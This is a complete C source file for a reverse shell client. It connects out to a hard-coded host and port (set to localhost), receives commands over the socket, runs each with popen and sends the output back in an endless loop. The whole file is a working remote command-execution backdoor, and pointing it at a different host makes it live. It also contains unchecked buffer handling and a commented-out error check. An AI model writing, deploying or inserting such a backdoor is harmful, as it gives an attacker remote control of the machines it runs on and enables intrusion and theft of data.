#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>

#define HOST "127.0.0.1"
#define PORT 8843
#define BUFFERSIZE 1024

char* execute(char* command) {
    char* output_string = malloc(BUFFERSIZE);
    int length_counter = 0;

    FILE *fptr;
    fptr = popen(command, "r");

    /*if(fptr == NULL) {
        strcpy(output_string, "Command unknown\n");
        return output_string;
    }*/

    char output_buffer[BUFFERSIZE];
    while((fgets(output_buffer, sizeof(output_buffer), fptr)) != NULL) {
        strcpy(output_string + length_counter, output_buffer);
        length_counter += strlen(output_buffer);
    }

    pclose(fptr);
    fptr = NULL;
    return output_string;
}

int main(void) {
    int sock_ret;
    struct sockaddr_in sock;
    
    // Create Socket in memory
    sock_ret = socket(AF_INET, SOCK_STREAM, 0);
    if(sock_ret == -1) {
        printf("Could not create socket\n");
        return -1;
    }

    // Convert IPV4 to binary and set port and tcp
    sock.sin_addr.s_addr = inet_addr(HOST);
    sock.sin_family = AF_INET;
    sock.sin_port = htons(PORT);

    // Connect to remote socket
    if(connect(sock_ret, (struct sockaddr *)&sock, sizeof(sock)) < 0) {
        printf("Could not connect to remote\n");
        return -1;
    }

    // Command execution loop
    while(1) {

        // Receive command from server
        char sock_buffer[BUFFERSIZE];
        if(recv(sock_ret, sock_buffer, BUFFERSIZE, 0) < 0) {
            printf("Error while receiving from server\n");
            return -1;
        }
        char* output = execute(sock_buffer);

        // Send output
        if(send(sock_ret, output, strlen(output), 0) < 0) {
            printf("Error while sending\n");
            return -1;
        }

        // Handle buffers
        memset(sock_buffer, 0, sizeof(sock_buffer));
        free(output);
        output = NULL;
    }
    return 0;
}
